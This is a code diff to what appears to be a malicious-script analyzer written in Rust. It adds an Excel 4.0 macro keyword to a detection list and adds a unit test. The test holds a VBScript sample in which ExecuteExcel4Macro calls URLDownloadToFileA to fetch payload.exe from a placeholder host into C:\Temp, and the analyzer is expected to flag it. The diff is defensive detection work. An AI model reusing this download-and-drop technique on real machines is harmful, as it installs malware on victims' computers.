@@ -3760,6 +3760,7 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool
         b"win32_process",
         b"option explicit",
         b"application.startuppath",
+        b"executeexcel4macro",
     ]
     .iter()
     .any(|needle| contains_ascii_case_insensitive_bytes(input, needle));
@@ -21361,6 +21362,35 @@ http.Send"#;
             ),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_execute_excel4_macro_urldownloadtofile_extracted() {
+        let vbs = br#"Dim formula
+formula = "CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""http://excel4.example/payload.exe"",""C:\Temp\payload.exe"",0,0)"
+ExecuteExcel4Macro formula"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload)
+                    .contains("ExecuteExcel4Macro formula")),
+            "Excel4Macro VBS source was not queued as VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://excel4.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+            )),
+            "Excel4Macro URLDownloadToFile URL was not extracted: {:?}",
+            report.traits
         );
     }
 
